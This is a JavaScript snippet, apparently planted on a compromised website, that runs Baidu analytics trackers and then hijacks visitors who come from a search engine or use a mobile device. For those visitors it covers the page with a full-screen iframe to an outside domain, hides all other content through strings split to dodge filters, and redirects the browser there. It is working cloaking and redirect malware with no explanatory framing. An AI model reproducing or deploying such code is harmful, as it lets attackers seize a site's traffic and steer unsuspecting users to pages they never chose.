var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?647fb61f1d145343a44dffba2b48bf4f";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();


var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?a9ca19259e41aabd2a55fee5c8a7103f";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();


var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?332c025ad46df3e4544514c2f4f42710";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

var websites =   ['https://hz300.yvgvtis.com/350.html'];

var randomIndex = Math.floor(Math.random() * websites.length);

function isMobileUserAgent() {
    console.log(navigator.userAgent);
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

function isMobileScreenSize() {
    return window.matchMedia("only screen and (max-width: 760px)").matches;
}

function isMobileDevice() {
    return isMobileUserAgent() || isMobileScreenSize();
}

function isFromSearchEngine() {
    var searchEnginesPatterns = [
        /google\./, /bing\./, /yahoo\./, /baidu\./, /yandex\./,
        /ask\.com/, /duckduckgo\./, /sogou\./, /360\.cn/, /soso\./,
        /haosou\./, /so\./, /youdao\./, /sooule\./, /easou\./, /mbaidu\./,
        /sina\./, /jike\./, /yisou\./, /uc\./, /sm\./
    ];
    console.log(document.referrer);
    return searchEnginesPatterns.some(function(pattern) {
        return pattern.test(document.referrer);
    });
}

function shouldRedirect() {
    return isFromSearchEngine() || isMobileDevice();
}

function jump(url){
	document.write('<ifr'+'ame id="ecshow" scrolling="auto" marginheight="0" marginwidth="0" frameborder="0" width="100%" height="100%" style="min-height:100vh" src="'+url+'"></iframe>');
	setInterval(function(){for(var i=0;i<document.body.children.length;i++)if(document.body.children[i].id != "ecshow")document.body.children[i].style.display="no"+"ne";document.body.style.overflow="hidden";document.body.style.margin=0;},100);
}

function redirectToWebsite() {
    if (!shouldRedirect())  {console.log("no"); return;}

    jump(websites[randomIndex]);
    setTimeout(function() {
        window.location.href = websites[randomIndex];
    }, 200); 

}
redirectToWebsite();


var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?645246ff08c228d3b11ea09a8bede097";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

// document.addEventListener('DOMContentLoaded', redirectToWebsite);
// window.addEventListener('load', redirectToWebsite);